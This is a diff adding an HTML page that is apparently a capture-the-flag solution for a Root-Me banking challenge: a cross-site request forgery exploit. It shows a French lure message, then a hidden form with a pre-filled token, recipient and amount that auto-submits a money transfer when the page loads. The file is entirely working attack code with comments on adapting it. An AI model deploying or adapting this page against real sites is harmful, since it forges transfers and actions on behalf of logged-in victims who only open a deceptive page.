@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>Juste un instant...</h1>
+    <p>Vous allez être redirigé vers une page intéressante !</p>
+    <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer/" method="POST">
+        <!-- Le token est inclus ici -->
+        <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6bHVuYToxMDA%3D">
+        <!-- Remplacez 'manon' par votre nom d'utilisateur -->
+        <input type="hidden" name="recipient" value="luna">
+        <!-- Montant du virement (modifiez si nécessaire) -->
+        <input type="hidden" name="amount" value="100">
+    </form>
+    <script>
+        // Soumission automatique du formulaire dès que la page est chargée
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
